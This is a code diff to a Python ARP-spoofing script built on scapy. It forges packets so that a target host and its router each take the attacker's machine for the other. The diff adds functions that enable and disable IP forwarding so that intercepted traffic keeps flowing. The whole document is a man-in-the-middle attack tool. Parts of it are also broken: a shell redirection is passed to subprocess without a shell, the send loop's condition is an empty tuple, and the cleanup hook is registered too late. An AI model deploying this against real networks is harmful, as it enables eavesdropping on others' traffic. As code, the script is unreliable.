@@ -2,10 +2,10 @@
 
 import scapy.all as scapy
 import argparse
-# import subprocess
+import subprocess
 # import re
 import time
-
+import atexit
 
 #    def router_ip_finder():
 #        dirty_Output = subprocess.check_output("route", shell=True)
@@ -51,6 +51,16 @@ def spoof(dest_IP, spoofed_IP):
     return packet
 
 
+def start_flow():
+    print("[+] Stated port forwarding")
+    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+
+def stop_flow():
+    print("[+] ending port forwarding")
+    subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
+
 def main():
     options = get_arguments()
     target_IP = options.target
@@ -59,13 +69,15 @@ def main():
     packet_for_target = spoof(target_IP, router_IP)
     packet_for_router = spoof(router_IP, target_IP)
 
-    # make funtction that opens neeeded ports for flowing traffic through
+    start_flow()
 
     print("[+] Spoofing has begin")
     while ():
         scapy.send(packet_for_target)
         scapy.send(packet_for_router)
         time.sleep(3)
+
+    atexit.register(stop_flow)
 
 
 main()
